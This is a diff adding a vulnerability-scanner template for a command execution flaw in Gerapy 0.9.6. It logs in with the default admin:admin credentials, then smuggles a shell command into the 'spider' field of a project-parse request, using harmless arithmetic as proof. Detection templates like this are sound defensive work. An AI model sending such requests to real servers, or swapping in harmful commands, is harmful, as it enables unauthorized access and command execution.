@@ -1,0 +1,69 @@
+id: gerapy-0-9-6-rce
+info:
+  name: Gerapy 0.9.6 Command Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Gerapy is a distributed crawler management framework based on Scrapy, Scrapyd, Django, and Vue.js. There exists a command execution vulnerability in Gerapy 0.9.6 and earlier versions (default password admin:admin), allowing attackers to execute commands on the server.
+  reference:
+    - https://github.com/Gerapy/Gerapy/releases
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 8.8
+  metadata:
+    vul-type: command-execution
+    product: Gerapy
+
+variables:
+  rand1: "{{rand_int(10000, 10100)}}"
+  rand2: "{{rand_int(5000, 5100)}}"
+  sum: "{{to_number(rand1) + to_number(rand2)}}"
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "{{BaseURL}}/api/user/auth"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {
+        "username": "admin",
+        "password": "admin"
+      }
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - '"token":"(.*?)"'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "token"
+        part: body
+
+  - id: exploit
+    method: POST
+    path:
+      - "{{BaseURL}}/api/project/1/parse"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+      Authorization: "Token {{token}}"
+    body: |
+      {
+        "spider": ";`expr {{rand1}} + {{rand2}}`"
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{sum}}"
+        part: body
